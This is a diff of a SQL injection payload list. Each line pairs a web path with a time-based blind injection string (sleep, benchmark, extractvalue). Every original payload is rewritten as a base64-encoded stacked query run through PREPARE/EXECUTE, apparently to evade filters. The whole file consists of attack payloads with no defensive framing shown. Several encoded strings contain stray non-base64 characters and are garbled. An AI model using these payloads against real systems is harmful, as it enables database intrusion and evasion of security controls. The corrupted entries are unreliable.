@@ -1,40 +1,40 @@
-/api/v1/products/1|' and (select * from (select(sleep(4)))a)
-/api/users/search/test|' and (select * from (select(sleep(4)))a)
-/view/type/1| and (select 1 from (select(sleep(3)))x)
-/api/v1/products/search/test|" and (select 2 from (select(sleep(2)))y)
-/api/items/cat/1| and (select 1 from (select(sleep(2)))x)
-/dashboard/id/1|' and (select 7544 from (select(sleep(3)))kNzZ) and 'vjXn'='vjXn
-/api/v2/news/id/1|' and (select(sleep(3)))#
-/products/id/1|' xor (select(6217) from (select(sleep(2)))a) xor 'b
-/index/user/admin|' and 9539=like('ABCDEFG', upper(hex(randomblob(200000000/2))))--
-/admin/login/id/1|' and (select 1 from (select(sleep(2)))x)--
-/api/v3/auth/user/1|' or (select(sleep(3)))#
-/index/cat/1| and 2254=benchmark(3000000,md5(1))--
-/main/id/1|' and (select 1 from (select(sleep(3)))x)
-/api/search/q/test|' union select sleep(3),2,3--
-/view/item/id/1| and 2212=benchmark(4000000,sha1(1))--
-/store/id/1|'-(select 6345 from (select(sleep(2)))a)-'
-/api/posts/id/1|)+and sleep(2) and (1182=1182
-/index/id/1| or 2 between 1 and benchmark(2000000,md5(1))--
-/api/v1/details/id/1|' and (select 1 from (select(sleep(2)))x)--
-/catalog/id/1| and (select 1 from (select(sleep(2)))and 5=5
-/api/v4/gate/id/1|' or (select * from (select(sleep(4)))a) union select 1--
-/login/user/1|')) or (select(sleep(3)))#
-/search/query/1|' and (select 2323 from (select(sleep(2)))a) and '1'='1
-/app/auth/token/1|" or (select 1 from(select(sleep(3)))x) or "1"="1
-/index/id/1|' and 2212=benchmark(5000000,sha1(1))--
-/admin/dash/p/1|' and (select(sleep(4))) order by 1--
-/api/v2/items/cat/1|' and (select(sleep(3))) procedure analyse()--
-/profile/user/1|' and (select 1 from (select(sleep(5)))k) or 'a'='a
-/api/v1/checkout/id/1|' or (select * from (select(sleep(3)))b) and '1'='1
-/member/action/view|' and updatesxml(1,concat(0x3a,(select(sleep(3)))),1)--
-/api/v3/metrics/q/1|' and extractvalue(1,concat(0x3a,(select(sleep(4)))))--
-/cart/item/1|' and json_keys((select convert((select(sleep(3))) using utf8)))--
-/api/v2/auth/login|") or (select 4421 from (select(sleep(4)))x) or ("1"="1
-/blog/id/1|' and (select 1 from (select(sleep(5)))a) procedure analyse(extractvalue(1,1),1)--
-/api/v1/download/file/1|' and (select 1 from(select(sleep(3)))x) union select '1'--
-/index/page/home|' xor (select 1 from (select(sleep(4)))a) xor '1'='1
-/api/v2/track/ip/1|' and 3121=benchmark(6000000,md5(now()))--
-/user/update/id/1|')) and (select 1 from (select(sleep(3)))x) and (('1'='1
-/api/v3/search/query/test|' or (select 1 from (select(sleep(4)))a) is null--
-/gallery/id/1|' and (select 1 from (select(sleep(3)))a) in (1,2,3)--
+/api/v1/products/1|'; SET @s=FROM_BASE64('JyBhbmQgKHNlbGVjdCAqIGZyb20gKHNlbGVjdChzbGVlcCg0KSkpYSk='); PREPARE stmt FROM @s; EXECUTE stmt;--
+/api/users/search/test|'; SET @s=FROM_BASE64('JyBhbmQgKHNlbGVjdCAqIGZyb20gKHNlbGVjdChzbGVlcCg0KSkpYSk='); PREPARE stmt FROM @s; EXECUTE stmt;--
+/view/type/1|'; SET @s=FROM_BASE64('IGFuZCAoc2VsZWN0IDEgZnJvbSAoc2VsZWN0KHNsZWVwKDMpKSl4KQ=='); PREPARE stmt FROM @s; EXECUTE stmt;--
+/api/v1/products/search/test|'; SET @s=FROM_BASE64('IiBhbmQgKHNlbGVjdCAyIGZyb20gKHNlbGVjdChzbGVlcCgyKSkpayk='); PREPARE stmt FROM @s; EXECUTE stmt;--
+/api/items/cat/1|'; SET @s=FROM_BASE64('IGFuZCAoc2VsZWN0IDEgZnJvbSAoc2VsZWN0KHNsZWVwKDIpKSl4KQ=='); PREPARE stmt FROM @s; EXECUTE stmt;--
+/dashboard/id/1|'; SET @s=FROM_BASE64('JyBhbmQgKHNlbGVjdCA3NTQ0IGZyb20gKHNlbGVjdChzbGVlcCgzKSlraU56KSBhbmQgJ3ZqWG4nPSd2alhuJw=='); PREPARE stmt FROM @s; EXECUTE stmt;--
+/api/v2/news/id/1|'; SET @s=FROM_BASE64('JyBhbmQgKHNlbGVjdChzbGVlcCgzKSkpIw=='); PREPARE stmt FROM @s; EXECUTE stmt;--
+/products/id/1|'; SET @s=FROM_BASE64('JyB4b3IgKHNlbGVjdCg2MjE3KSBmcm9tIChzZWxlY3Qoc2xlZXAoMikpKWEpIHhvciAnYg=='); PREPARE stmt FROM @s; EXECUTE stmt;--
+/index/user/admin|'; SET @s=FROM_BASE64('JyBhbmQgOTUzOT1saWtlKCdBQkNERUZHJywgdXBwZXIoaGV4KHJhbmRvbWJsb2IoMjAwMDAwMDAwLzIpKSkpLS0='); PREPARE stmt FROM @s; EXECUTE stmt;--
+/admin/login/id/1|'; SET @s=FROM_BASE64('JyBhbmQgKHNlbGVjdCAxIGZyb20gKHNlbGVjdChzbGVlcCgyKSkp猥ktLQ=='); PREPARE stmt FROM @s; EXECUTE stmt;--
+/api/v3/auth/user/1|'; SET @s=FROM_BASE64('JyBvciAoc2VsZWN0KHNsZWVwKDMpKSkj'); PREPARE stmt FROM @s; EXECUTE stmt;--
+/index/cat/1|'; SET @s=FROM_BASE64('IGFuZCAyMjU0PWJlbmNobWFyaygzMDAwMDAwLG1kNSgxKSktLQ=='); PREPARE stmt FROM @s; EXECUTE stmt;--
+/main/id/1|'; SET @s=FROM_BASE64('JyBhbmQgKHNlbGVjdCAxIGZyb20gKHNlbGVjdChzbGVlcCgzKSkp猥k='); PREPARE stmt FROM @s; EXECUTE stmt;--
+/api/search/q/test|'; SET @s=FROM_BASE64('JyB1bmlvbiBzZWxlY3Qgc2xlZXAoMyksMiwzLS0='); PREPARE stmt FROM @s; EXECUTE stmt;--
+/view/item/id/1|'; SET @s=FROM_BASE64('IGFuZCAyMjEyPWJlbmNobWFyayg0MDAwMDAwLHNoYTEoMSkpLS0='); PREPARE stmt FROM @s; EXECUTE stmt;--
+/store/id/1|'; SET @s=FROM_BASE64('Jy0oc2VsZWN0IDYzNDUgZnJvbSAoc2VsZWN0KHNsZWVwKDIpKSlhKS0n'); PREPARE stmt FROM @s; EXECUTE stmt;--
+/api/posts/id/1|'; SET @s=FROM_BASE64('KSthbmQgc2xlZXAoMikgYW5kICgxMTgyPTExODIK'); PREPARE stmt FROM @s; EXECUTE stmt;--
+/index/id/1|'; SET @s=FROM_BASE64('IG9yIDIgYmV0d2VlbiAxIGFuZCBiZW5jaG1hcmsoMjAwMDAwMCxtZDUoMSkpLS0='); PREPARE stmt FROM @s; EXECUTE stmt;--
+/api/v1/details/id/1|'; SET @s=FROM_BASE64('JyBhbmQgKHNlbGVjdCAxIGZyb20gKHNlbGVjdChzbGVlcCgyKSkp猥ktLQ=='); PREPARE stmt FROM @s; EXECUTE stmt;--
+/catalog/id/1|'; SET @s=FROM_BASE64('IGFuZCAoc2VsZWN0IDEgZnJvbSAoc2VsZWN0KHNsZWVwKDIpKWFuZCA1PTU='); PREPARE stmt FROM @s; EXECUTE stmt;--
+/api/v4/gate/id/1|'; SET @s=FROM_BASE64('JyBvciAoc2VsZWN0ICogZnJvbSAoc2VsZWN0KHNsZWVwKDQpKSlhKSB1bmlvbiBzZWxlY3QgMS0t'); PREPARE stmt FROM @s; EXECUTE stmt;--
+/login/user/1|'; SET @s=FROM_BASE64('JykpIG9yIoc2VsZWN0KHNsZWVwKDMpKSkj'); PREPARE stmt FROM @s; EXECUTE stmt;--
+/search/query/1|'; SET @s=FROM_BASE64('JyBhbmQgKHNlbGVjdCAyMzIzIGZyb20gKHNlbGVjdChzbGVlcCgyKSkpYSkgYW5kICcxJz0nMSc='); PREPARE stmt FROM @s; EXECUTE stmt;--
+/app/auth/token/1|'; SET @s=FROM_BASE64('IiBvciAoc2VsZWN0IDEgZnJvbShzZWxlY3Qoc2xlZXAoMykpKXgpIG9yICIxIj0iMSI='); PREPARE stmt FROM @s; EXECUTE stmt;--
+/index/id/1|'; SET @s=FROM_BASE64('JyBhbmQgMjIxMj1iZW5jaG1hcmsoNTAwMDAwMCxzaGExKDEpKS0t'); PREPARE stmt FROM @s; EXECUTE stmt;--
+/admin/dash/p/1|'; SET @s=FROM_BASE64('JyBhbmQgKHNlbGVjdChzbGVlcCg0KSkpIG9yZGVyIGJ5IDEtLQ=='); PREPARE stmt FROM @s; EXECUTE stmt;--
+/api/v2/items/cat/1|'; SET @s=FROM_BASE64('JyBhbmQgKHNlbGVjdChzbGVlcCgzKSkpIHByb2NlZHVyZSBhbmFseXNlKCktLQ=='); PREPARE stmt FROM @s; EXECUTE stmt;--
+/profile/user/1|'; SET @s=FROM_BASE64('JyBhbmQgKHNlbGVjdCAxIGZyb20gKHNlbGVjdChzbGVlcCg1KSlraykgb3IgYSc9J2E='); PREPARE stmt FROM @s; EXECUTE stmt;--
+/api/v1/checkout/id/1|'; SET @s=FROM_BASE64('JyBvciAoc2VsZWN0ICogZnJvbSAoc2VsZWN0KHNsZWVwKDMpKSliKSBhbmQgJzEnRT0nMSc='); PREPARE stmt FROM @s; EXECUTE stmt;--
+/member/action/view|'; SET @s=FROM_BASE64('JyBhbmQgdXBkYXRlc3htbCgxLGNvbmNhdCgweDNhLChzZWxlY3Qoc2xlZXAoMykpKSksMSktLQ=='); PREPARE stmt FROM @s; EXECUTE stmt;--
+/api/v3/metrics/q/1|'; SET @s=FROM_BASE64('JyBhbmQgZXh0cmFjdHZhbHVlKDEsY29uY2F0KDB4M2EsKHNlbGVjdChzbGVlcCg0KSkpKSktLQ=='); PREPARE stmt FROM @s; EXECUTE stmt;--
+/cart/item/1|'; SET @s=FROM_BASE64('JyBhbmQganNvbl9rZXlzKChzZWxlY3QgY29udmVydCgoc2VsZWN0KHNsZWVwKDMpKSkgdXNpbmcgdXRmOCkpKS0t'); PREPARE stmt FROM @s; EXECUTE stmt;--
+/api/v2/auth/login|'; SET @s=FROM_BASE64('Iikgb3IgKHNlbGVjdCA0NDIxIGZyb20gKHNlbGVjdChzbGVlcCg0KSkp猥kgb3IgKCIxIj0iMQ=='); PREPARE stmt FROM @s; EXECUTE stmt;--
+/blog/id/1|'; SET @s=FROM_BASE64('JyBhbmQgKHNlbGVjdCAxIGZyb20gKHNlbGVjdChzbGVlcCg1KSkpYSkgcHJvY2VkdXJlIGFuYWx5c2UoZXh0cmFjdHZhbHVlKDEsMSksMSktLQ=='); PREPARE stmt FROM @s; EXECUTE stmt;--
+/api/v1/download/file/1|'; SET @s=FROM_BASE64('JyBhbmQgKHNlbGVjdCAxIGZyb20oc2VsZWN0KHNsZWVwKDMpKSl4KSB1bmlvbiBzZWxlY3QgJzEnLS0='); PREPARE stmt FROM @s; EXECUTE stmt;--
+/index/page/home|'; SET @s=FROM_BASE64('JyB4b3IgKHNlbGVjdCAxIGZyb20gKHNlbGVjdChzbGVlcCg0KSkpYSkgeG9yICcxJz0nMSc='); PREPARE stmt FROM @s; EXECUTE stmt;--
+/api/v2/track/ip/1|'; SET @s=FROM_BASE64('JyBhbmQgMzEyMT1iZW5jaG1hcmsoNjAwMDAwMCxtZDUobm93KCkpKS0t'); PREPARE stmt FROM @s; EXECUTE stmt;--
+/user/update/id/1|'; SET @s=FROM_BASE64('JykpIGFuZCAoc2VsZWN0IDEgZnJvbSAoc2VsZWN0KHNsZWVwKDMpKSl4KSBhbmQgKChgMSc9JzEn'); PREPARE stmt FROM @s; EXECUTE stmt;--
+/api/v3/search/query/test|'; SET @s=FROM_BASE64('JyBvciAoc2VsZWN0ICogZnJvbSAoc2VsZWN0KHNsZWVwKDQpKSlhKSBpcyBudWxsLS0='); PREPARE stmt FROM @s; EXECUTE stmt;--
+/gallery/id/1|'; SET @s=FROM_BASE64('JyBhbmQgKHNlbGVjdCAxIGZyb20gKHNlbGVjdChzbGVlcCgzKSkpYSkgaW4gKDEsMiwzKS0t'); PREPARE stmt FROM @s; EXECUTE stmt;--
